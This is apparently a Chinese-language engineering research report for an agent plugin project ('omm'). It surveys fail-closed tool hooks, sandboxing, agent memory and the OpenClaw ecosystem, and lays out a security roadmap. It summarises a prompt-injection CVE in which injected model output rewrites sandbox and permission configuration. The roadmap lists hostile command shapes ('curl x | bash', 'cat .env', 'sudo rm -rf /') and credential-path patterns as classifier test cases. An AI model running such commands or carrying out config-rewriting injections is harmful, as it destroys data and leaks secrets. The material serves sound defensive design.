- **OpenClaw CVE-2026-35650：prompt injection 重写沙箱策略/插件权限/路由 hooks**。[二手-安全厂商] [PointGuard AI 2026-05](https://www.pointguardai.com/ai-security-incidents/openclaw-flaws-let-prompt-injections-hijack-agent-configs-cve-2026-35650)：三个漏洞，prompt 注入的模型输出可改写 sandbox policies / plugin permissions / routing hooks；修复于 OpenClaw 2026.4.20。**这是 omm"prompt 约束不可信 → runtime 强制"哲学的直接业界证据**——也提示 omm 的 WORKFLOW.md 配置面、权限配置面本身必须被 fail-closed 守卫覆盖（配置即攻击面）。另见 [二手] [OpenClaw 威胁全景](https://threadlinqs.com/blog/openclaw-threat-landscape-2026/)（恶意 skill、GhostClaw npm 包、`openclaw security audit`）——**skill/插件供应链审计是 OpenClaw 生态 2026 的主旋律**，omm 作为该生态插件应关注 host 侧的审计基线对齐。
- **Claude Code hooks 的 fail-closed 语义与边界**。[二手-field guide] [PAPE Tier 5](https://agentic-engineering.guide/tier-5)：`PreToolUse` exit 2 直接阻断工具，**deny 先于权限检查触发，在 `--dangerously-skip-permissions` 下仍生效（hooks 只能收紧、永不放宽）**；`Stop` hook exit 2 强制继续但 Claude 在连续 8 次阻断后覆盖（须用 `stop_hook_active` 防死循环）。对 omm 的含义：omm 走 OpenClaw `before_tool_call` priority 11 fail-closed（`dynamic-workflows/index.ts`），语义等价于 PreToolUse deny——**"只能收紧不能放宽"的不变量在两个宿主上一致**，是 permission-policy 可依赖的跨宿主公理。
- **Multicorn Shield：PreToolUse fail-closed 产品化先例**。[一手-changelog] [multicorn.ai/changelog](https://multicorn.ai/changelog)：Claude Code PreToolUse hook 在 Shield API 不可达时 fail closed（exit 2），并声称与"OpenClaw 插件及 MCP proxy 自 v0.1.15 起的 fail-closed 行为"对齐。**佐证 fail-closed 已成跨宿主产品默认**；omm dynamic-workflows 的三处 fail-closed 与该实践一致。
- **sandboxing 分层共识**。[二手] [beyondscale 2026-04](https://beyondscale.tech/blog/ai-agent-sandboxing-enterprise-security-guide)、[trezalabs 2026-06](https://www.trezalabs.com/blog/ai-agent-sandboxing-hardware-isolation-containment)：软件沙箱（容器/seccomp/网络策略）必要不充分，凭证持有型长时自主 agent 是最高价值目标。omm 不做沙箱（host/部署层职责），但 oh-my-cli 的 folder-trust（C6）"launcher 广告 enforced sandbox 则信任"的**四级信任状态机**是 omm 可借鉴的"omm 与外层沙箱的关系"建模方式。
- **Dyad**：本轮未找到其 "permission hooks" 的一手技术资料；[一手-官网] [dyad.sh](https://www.dyad.sh/) 自述为本地开源 AI app builder（BYO model、内置 security review 扫描 SQL 注入/XSS/认证 misconfig）。**信息缺口**：Dyad 的权限钩子是任务书提及的方向，本轮检索未见其公开机制文档，未核实，不纳入吸纳清单。

### 3.4 跨会话记忆

- **格局**：[二手，多源] [niteagent 2026-05](https://niteagent.com/blog/ai-agent-memory-comparison-2026/)、[brain.aivm 2026-07](https://brain.aivm.io/blog/agent-memory-layers-compared)：Mem0（~48k★，vector+graph+kv 三后端，提取管线，SOTA 声明有争议）；Zep（**时间感知知识图谱**——fact 带 valid/invalid 区间，知道"什么时候为真"）；Letta（OS 式分层记忆，自管理）；claude-mem（免费本地，hooks 捕获 + 压缩）；LangMem（LangGraph 原生）。
- **对 omm instinct 的具体启示**：① **时间有效性**是 instinct JSONL 目前完全没有的维度（`instinct/src/store.ts` 只有 ts 时间戳，无失效语义）——Zep 的 temporal fact 模型是 instinct 二期 extraction 的参照；② claude-mem 证明"hooks 捕获 + 本地压缩"路线可产品化（omm instinct 同路线，互证）；③ 所有 LLM 提取型方案都需要 cheap-agent 原语——omm 已正确识别此 blocker（`instinct/index.ts:11-13` 注释），业界无零 LLM 的提取方案，**维持"先 substrate 后 distillation"的 ponytail 决策**。
- **脱敏是记忆层的入场券而非可选项**：三家本地项目（oh-my-cli/loopx/OMC）+ Mem0 企业卖点都把 PII/secret 处理前置。omm instinct 已有 scrubSecrets；升级为 permission-policy 共享原语（C2）后即对齐。

### 3.5 OpenClaw / Claude Code 插件生态新项目

- **OpenClaw 生态体量与安全关注同步暴涨**。[二手] [generect 2026-06](https://generect.com/blog/openclaw-ai-agent/) 声称 380k★（未核实，疑夸大，仅作生态热度信号）；[一手性质-文档站] [glukhov.org 插件指南](https://www.glukhov.org/ai-systems/openclaw/plugins/)：插件 hooks 可拦截 model resolution / agent lifecycle / message flow / tool execution / sub-agent coordination / gateway lifecycle——omm 12 hooks 覆盖面与之相符。[二手] [Hermes Agent vs OpenClaw](https://getclaw.sh/blog/hermes-agent-vs-openclaw-every-feature-that-matters-for-vcs-2026)：Hermes v0.9 加本地 dashboard、后台进程监控、审批按钮——**operator 面成熟度是生态竞争点**，omm 的 compact projection 路线正确但功能面落后于"审批按钮"类交互（human gate ticket 01 正是补此）。
- **Claude Code 工作流插件对比**：[二手] [chenguangliang 2026-05](https://chenguangliang.com/en/posts/claude-code-workflow-plugins-comparison/)：Superpowers / Shipyard / Ralph Loop / Maestro / Karpathy CLAUDE.md 的选用决策树。OMM 不在 Claude Code 生态内竞争，但该对比的"按痛点选插件"框架可作 omm 文档定位参考。
- **Claude Code agent teams / subagents**：已由 benchmark doc §3.4 覆盖（[一手继承] [VS Code Multi-Agent 2026/02](https://code.visualstudio.com/blogs/2026/02/05/multi-agent-development)），本轮未见超越该时点的一手新事实。

---

## 4. 综合吸纳路线图（P0/P1/P2，落到 omm 具体包）

### P0（下一个 minor 可做，全部 S，零哲学冲突）

1. **permission-policy 命令分类增强包**（C1 + A1 + C2 合三为一，一次发版）：
   - `CommandProvenance`（builtin/repository/issue 三轴，issue 来自哪由调用方传入）
   - `remote_code_execution` 规则：网络 fetch 管道进解释器集合（照 oh-my-cli `command-policy.ts:105-113` 的 bounded INTERPRETERS 集合）
   - 凭据路径正则（`.ssh/`、`*.env`、`.aws/credentials` 等）入分类
   - heredoc 体检测 + 危险 shell 字符集（OMC `permission-handler/index.ts:47-64`，注意其"cat/head/tail 移出白名单"教训）
   - `redactSecrets` 提为 permission-policy 导出原语（known-token 形状库），instinct `store.ts` 与 `audit-persister.ts` 改为复用
   - 验收：现有 classifyCommand 测试全绿 + 新增形状用例（`curl x | bash`、`cat .env`、`sudo rm -rf /`、heredoc 包装）
2. **auto-achieve 守卫语义**（C3）：`evidence-gate.ts` 加 goal revision 计数 → goal 修订后旧 evidence 标 stale；`completion-detector.ts` 对 provider-failure/interrupted turn 不计完成证据。与 oh-my-cli `auto-achieve-guard.ts` 五 blocker 对齐命名。
3. **同错误签名连续 N 次 → 终止升级**（A3 + C10）：`tool-error-tracker.ts` 加错误签名（tool + 规范化 message）连续计数，达阈值（默认 3，三家独立收敛值）→ 新 blocked reason `repeated_error`（resumable），区别于 no_progress。stall-detector 不变。

### P1（需要设计文档或跨包协调，S-M）

1. **多维预算**（C5）：tool-calls 计数维度（确定性，不依赖 host telemetry）+ wall-time。与 loopx windowed slot quota（ticket 03）合流设计一份设计文档：`maxContinuationsPerWindow`（ticket 03 已有）与 `maxToolCallsPerGoal` 共用窗口/throttle/退款语义。落点：`autopilot/src/types.ts` + `continuation-engine.ts`。
2. **turn checkpoint / undo**（C4）：`autopilot/src/turn-checkpoint.ts` 新模块。**前置信息缺口**（§6 #1）：确认 OpenClaw `before_tool_call` 能否在写类工具执行前读到目标文件内容（拿不到则 pre-image 无从采集，降级为 git-stash-based 或放弃）。divergence fail-closed + 幂等 + receipt 三件套照 oh-my-cli 设计。
3. **dynamic-workflows skill 与 OpenProse 0.10+ 校准**（§3.2）：diff `packages/dynamic-workflows/skill/`（11 模式/19 角色/refute gate）对上游 `skills/open-prose/` 0.10.x + rawwerks 6-core taxonomy，产出模式覆盖 diff 文档，必要时更新 skill 教学内容。文档级，S。
4. **projection lineage 字段**（§2.3.2）：`autopilot/src/projection.ts` 输出加 `supersedes`/`sourceId` 式 lineage（照 loopx AGENTS.md projection sink 纪律），让宿主 UI 的行级演化可读。S。

### P2（host-dependent 或二期，M-L）

1. **folder-trust 原语**（C6）：先理清与 host trustWorkspace 的关系（避免第二信任源——这是 3.0.0 flip 教训的直接延伸），再决定 permission-policy 出判定函数还是只出契约文档。
2. **compaction sidecar digest + receipt**（C7）：依赖 transcript 可见性（§6 #2）。
3. **worktree-lease 契约**（C9）：写进 dynamic-workflows 设计文档作为 host 建议，omm 不实现。
4. **instinct 二期参照库**（A5 + §3.4）：goal-scoped recall（loopx agent_turn_recall）、temporal validity（Zep）、rescan merge 纪律（OMC project-memory）。在 instinct 立项 extraction 时作为设计输入，本轮不动代码。

### 显式不做（冲突项汇总）

- in-loop 模型判定完成 / critic 模式（⚠️ ADR-019，§2.2.4）
- PRD 多 story 规划阶段（⚠️ 无规划阶段 + OpenProse sole runtime，§2.2.4）
- prompt 层 continuation 强制（⚠️ 哲学冲突，omm runtime 已严格更强）
- BACKGROUND_MUTATION_SUBAGENTS 角色分级（⚠️ 与"子代理皆不可信"D6 张力，无真实需求不引）

---

## 5. 来源清单

### 本地项目（源码一手，本轮直接读取）

- **oh-my-cli**（`/Users/guanxueliang/Desktop/Matrix/DynamicWorkflow/oh-my-cli`）：`README.md:11-33` · `AUTONOMY.md:73-106` · `src/command-policy.ts:1-21,31-46,72-76,105-133,143-150` · `src/permission-impact.ts:1-15,44-56` · `src/folder-trust.ts:1-24` · `src/turn-checkpoint.ts:1-21` · `src/run-recovery.ts:1-15` · `src/compaction.ts:1-20` · `src/goal-queue.ts:1-15` · `src/goal-budgets.ts:1-10` · `src/auto-achieve-guard.ts:1-10` · `src/progress-loop-detector.ts:1-10,32-60` · `src/worktree-lease.ts:1-20` · `src/session.ts:1-46` · `src/evidence-archive.ts:1-22` · `src/approval.ts:1-28`
- **oh-my-claudecode**（`/Users/guanxueliang/Desktop/Matrix/DynamicWorkflow/oh-my-claudecode`）：`package.json:1-7` · `AGENTS.md:345-354`（状态/隔离/PID liveness）· `src/hooks/ralph/loop.ts:1-11,89-114,289-294,349-363,527-563` · `src/hooks/ralph/prd.ts:23-51` · `src/hooks/ralph/verifier.ts:1-13,53-55` · `src/hooks/permission-handler/index.ts:33-87` · `src/features/verification/index.ts:27-87` · `src/features/continuation-enforcement.ts:52-54,74-134` · `src/features/model-routing/scorer.ts:19-62` · `src/hooks/preemptive-compaction/index.ts:36-50` · `src/mcp/prompt-injection.ts:42-48` · `src/hooks/project-memory/index.ts:17-41` · `skills/autopilot/SKILL.md:39-74,106-111`
- **loopx**（`/Users/guanxueliang/Desktop/Matrix/DynamicWorkflow/loopx`，主评估见 `docs/design/loopx-intake-recommendation.md` §9 引用清单）：`authority.py:17-33` · `capabilities/agent_turn_recall/`（core.py、cli.py）· `AGENTS.md`（Projection Sink Design / Automation And Monitor Todos 节）
- **omm 自身**：`packages/permission-policy/src/permission-policy.ts` · `packages/instinct/index.ts:11-13,114-122` + `src/store.ts` · `packages/autopilot/src/`（evidence-gate.ts、completion-detector.ts、tool-error-tracker.ts、stall-detector.ts、state-persister.ts、model-routing.ts、size-classifier.ts、effort-injection.ts:43-44、types.ts）· `packages/dynamic-workflows/index.ts` + `skill/` · `docs/adr/019-conditional-evidence-judging-boundary.md` · `docs/design/loopx-intake-recommendation.md` · `docs/design/ecc-intake-recommendation.md` · `docs/analysis/autopilot-dynamic-workflows-industry-benchmark.md`

### 业界（URL；[一手]/[二手] 标注见 §3 各条）

- OpenProse — https://github.com/openprose/prose · https://github.com/openprose/prose/blob/main/CHANGELOG.md · https://prose.md/learn
- rawwerks/dynamic-agent-workflows — https://github.com/rawwerks/dynamic-agent-workflows/blob/main/AGENTS.md
- ralph 生态 — https://github.com/snarktank/ralph · https://boostn.ai/en/app/news/ralph-loop-loop-engineering-token-burn/ · https://theaiarchitects.com/blog/claude-code-ralph-loop
- LangGraph — https://docs.langchain.com/oss/python/langchain/human-in-the-loop（继承 benchmark doc）· https://zenthos.in/blogs/langgraph-postgres-checkpointer-production · https://www.diagrid.io/blog/checkpoints-are-not-durable-execution-why-langgraph-crewai-google-adk-and-others-fall-short-for-production-agent-workflows
- OpenHands — https://arxiv.org/html/2511.03690v2 · https://docs.openhands.dev/sdk/guides/convo-persistence · https://docs.openhands.dev/sdk/guides/convo-pause-and-resume
- 框架格局 — https://learnagent.org/library/compare/agent-framework-comparison-2026/ · https://genai.qa/blog/crewai-vs-autogen/ · https://agentmelt.com/blog/ai-agent-frameworks-compared-2026/ · https://www.raftlabs.com/blog/ai-agent-framework-comparison
- 安全 — https://www.pointguardai.com/ai-security-incidents/openclaw-flaws-let-prompt-injections-hijack-agent-configs-cve-2026-35650 · https://threadlinqs.com/blog/openclaw-threat-landscape-2026/ · https://agentic-engineering.guide/tier-5 · https://multicorn.ai/changelog · https://beyondscale.tech/blog/ai-agent-sandboxing-enterprise-security-guide · https://www.dyad.sh/
- 记忆 — https://niteagent.com/blog/ai-agent-memory-comparison-2026/ · https://brain.aivm.io/blog/agent-memory-layers-compared · https://mem0.ai/blog/claude-code-memory
- 生态 — https://www.glukhov.org/ai-systems/openclaw/plugins/ · https://getclaw.sh/blog/hermes-agent-vs-openclaw-every-feature-that-matters-for-vcs-2026 · https://chenguangliang.com/en/posts/claude-code-workflow-plugins-comparison/ · https://code.visualstudio.com/blogs/2026/02/05/multi-agent-development（继承 benchmark doc）

---

## 6. 信息缺口与诚实声明

1. **OpenClaw hook 能力边界未核实**：turn-checkpoint（C4/P1-5）需要 `before_tool_call` 在写类工具执行前能读到目标文件内容；compaction sidecar digest（C7/P2-9）需要 transcript 可见性。两者都取决于 host hook 事件载荷，本轮未核实——P1-5 落地前必须先答。
2. **Dyad permission hooks 未找到一手资料**（§3.3 末条），任务书点名的此方向本轮未能覆盖。
3. **业界条目以搜索快照为主**：§3 中标注 [二手] 的结论未经一手文档逐字核实（OpenProse/rawwerks/OpenHands/PAPE/Multicorn 为一手或一手性质）；数字类声明（如 OpenClaw 380k★、框架市占）一律视为未核实信号。
4. **OMC 深读覆盖度**：OMC 体量极大（src + bridge 约 17 万行级），本轮精读了 ralph/permission/verification/model-routing/状态隔离等与安全-长程主线相关的模块；`team`/`swarm` 的 MCP 运行时（team-server.ts、team-bridge.cjs）只读了结构未深读，若未来考虑多 agent 并行协调需补读。
5. **loopx 本轮为增量扫描**：核心机制以既有 intake 文档为准（该文档含 3 轮 Explore 逆向 + 业界对照），本轮未重新逐行复核其实施进展（§7 表格的 ticket 状态以 2026-08-12 快照为准）。
6. 本报告未运行任何代码、未修改 omm 任何既有文件；所有吸纳建议均为非约束性分析，落地需各自走设计文档/ticket 流程。

---

> **报告自检**：✅ 只新增本文件，未改动 omm 代码与既有文档 / ✅ 本地结论全部带 `file:line` / ✅ 业界结论全部带 URL 且区分一手/二手 / ✅ 冲突项显式标注 ⚠️ 并给论证 / ✅ 信息缺口单列（§6）/ ✅ 未重复 loopx-intake 既有 10 点，仅增量 / ✅ 路线图落到具体包与具体文件
